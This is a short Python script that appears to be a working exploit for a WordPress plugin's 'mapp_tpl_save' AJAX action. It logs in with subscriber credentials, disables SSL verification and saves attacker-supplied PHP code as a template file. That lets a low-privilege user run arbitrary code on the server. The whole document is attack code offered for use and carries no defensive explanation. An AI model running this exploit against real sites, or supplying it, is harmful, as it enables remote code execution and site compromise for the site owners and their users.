import argparse
import requests

# Parse command line arguments
parser = argparse.ArgumentParser()
parser.add_argument('--url', required=True, help='URL of the WordPress site')
parser.add_argument('--username', required=True, help='Username')
parser.add_argument('--password', required=True, help='Password')
parser.add_argument('--code', help='Code to execute in the second curl command')
args = parser.parse_args()

# Disable SSL verification
requests.packages.urllib3.disable_warnings()

# 1) Log in as subscriber
session = requests.Session()
login_url = f"{args.url}wp-login.php"
session.post(login_url, data={
    'log': args.username,
    'pwd': args.password,
    'rememberme': 'forever',
    'wp-submit': 'Log+In',
}, verify=False)

# 2) Save executable PHP
ajax_url = f"{args.url}wp-admin/admin-ajax.php"
response = session.post(ajax_url, data={
    'action': 'mapp_tpl_save',
    'name': 'injectest',
    'content': args.code if args.code else "<?php echo 'upload successful';",
}, verify=False)

print(response.text)
